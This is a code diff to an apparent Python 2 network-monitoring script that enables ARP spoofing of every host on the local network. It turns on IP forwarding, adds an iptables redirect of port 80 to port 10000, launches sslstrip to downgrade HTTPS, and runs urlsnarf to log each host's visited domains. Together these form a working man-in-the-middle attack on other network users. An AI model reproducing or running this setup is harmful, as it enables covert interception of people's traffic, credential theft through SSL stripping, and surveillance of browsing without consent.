@@ -10,8 +10,8 @@ import functions
 from sys import exit,stdin
 from user import *
 from os import system
-import subprocess
-
+from subprocess import Popen,PIPE
+from urlparse import urlparse
 # except ImportError:
 #
 #     #TODO: handle all cases of missing modules and try to solve
@@ -21,7 +21,6 @@ import subprocess
 # global variables:
 localAddresses=[]
 addressesLock=Lock()
-gatewayMAC=''
 user_list=[]
 localHost=''
 main_conn=Pipe()
@@ -46,21 +45,30 @@ def blocked(user,url):
             return False
     return True
 
+def process_domain(domain,ip):
+	pass
 def handle_packet(pkt):
 	"""
-	detects http packets and extracts urls to save in the database
+	checks for new host/addresses changes on network
+	
+	checks if arp operation is 'is-at' adn then update new address in the local addresses dict
+	
 	"""
 
 	if ARP in pkt:
-		if pkt[ARP].op == 2: #check if ARP operation is: is-at
+		if pkt[ARP].op == 2 and pkt[Ether].src!='b8:27:eb:fc:2f:ef': #check if ARP operation is: is-at
 			address=pkt[ARP].psrc #extract IP address
 			addressesLock.acquire()
 			global localAddresses
-			global defaultGateway
 			global localHost
+			global defaultGateway
+			print localHost+'_'
+			print defaultGateway+'_'
+			print address+'_'
 			if address not in localAddresses.keys() and address != defaultGateway and address!=localHost: #check for duplicates and not default gateway or local host
 				localAddresses[address]=pkt[Ether].src #add IP  and MAC address to dict of all hosts
 				logging.info('added: {}'.format(address))
+				print 'added: {}'.format(address)
 			addressesLock.release()
 		
         
@@ -69,7 +77,7 @@ def spoof(target,defaultGateway):
 	arp spoofs specific ip address
 	utilizes arpspoof package
 	"""
-	system('arpspoof -i eth0 -t {} {}'.format(target,defaultGateway)) #-i [interface] -t [target] [gateway]
+	Popen('arpspoof -i eth0 -t {} {}'.format(target,defaultGateway),stdout=PIPE,stdin=PIPE,shell=True) #-i [interface] -t [target] [gateway]
 	
 def arp_spoof(defaultGateway):
 	"""
@@ -85,17 +93,27 @@ def arp_spoof(defaultGateway):
 				s2.start()
 				threads[target]=[s,s2]
 				logging.debug('spoofing:'+target)
-	logging.info('spoofing al hosts')
+				
+	logging.info('spoofing all hosts')
 		
-		
+def arp_sniff():
+	""" 
+	sniff for incoming arp packets
+	"""
+	sniff(prn=handle_packet)
+    
+    
 def setup():
     """
     get all necessary values for the program to run
     and start all threads
     """
     #get default gateway, local IP address and local MAC address
-    defaultGateway,localHost,gatewayMAC=functions.getLocalhostAddress()
-    print defaultGateway,gatewayMAC,localHost
+    global defaultGateway
+    global localHost
+    defaultGateway,localHost=functions.getLocalhostAddress()
+    logging.info('router:{}, local host:{}'.format(defaultGateway,localHost))
+    print defaultGateway,localHost
 
 	#get addresses of all hosts on network
     global localAddresses
@@ -106,20 +124,30 @@ def setup():
     logging.info('scanned network for all active hosts')
     print localAddresses
 	
+	#turn ip forwarding on
+    system('sysctl -w net.ipv4.ip_forward=1')
+    logging.info('ip forwarding enabled')
+    
+    Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=PIPE, stderr=PIPE, shell=True)
+    Popen('sslstrip -p -k -f', stdout=PIPE, stderr=PIPE, shell=True)
+	
 	#create process for spoofing all hosts on network
     arpThread=Process(target=arp_spoof,args=(defaultGateway,))
     logging.info('created process for ARP spoofing')
-    #arpThread.start()
+    arpThread.start()
     
-    target='192.168.1.33'
+    """target='192.168.1.33'
     s=Thread(target=spoof,args=(target,defaultGateway,)) #thread for spoofing target
     s.start()
     s2=Thread(target=spoof,args=(defaultGateway,target)) #thread for spoofing router
-    s2.start()
+    s2.start()"""
 				
-    #turn ip forwarding on
-    system('sysctl -w net.ipv4.ip_forward=1')
-    logging.info('ip forwarding enabled')
+    arp_sniffer=Thread(target=arp_sniff)
+    arp_sniffer.start()
+    logging.info('arp sniffer started')
+    print 'arp sniffer'
+    
+    return 1
 
 
 
@@ -137,13 +165,28 @@ def main(conn=None):
     setup() 
     logging.info('setup complete')
     
-    sniff(prn=handle_packet)
+    
 	
     global main_conn
     main_conn=conn
     
-    system('urlsnarf > sniff.txt')
-    	
+    print 'sniffing urls'
+    urlsnarf=Popen('urlsnarf',stdout=PIPE,shell=True)
+    logging.info('urlsnarf started')
+    last_domain=''
+    while True:
+    	output=urlsnarf.stdout.readline()
+    	fields=output.split(' ')
+    	ip=fields[0]
+
+    	for f in fields:
+    		if 'http' in f and '?' not in f:
+    			url=f
+    			domain=url.split('/')[2]
+    			if domain != last_domain:
+    				last_domain=domain
+    				logging.debug('ip:{},domain:{}'.format(ip,domain))
+					#process_domain(domain,ip) 	
     """while True:
         command=main_conn.recv()
 
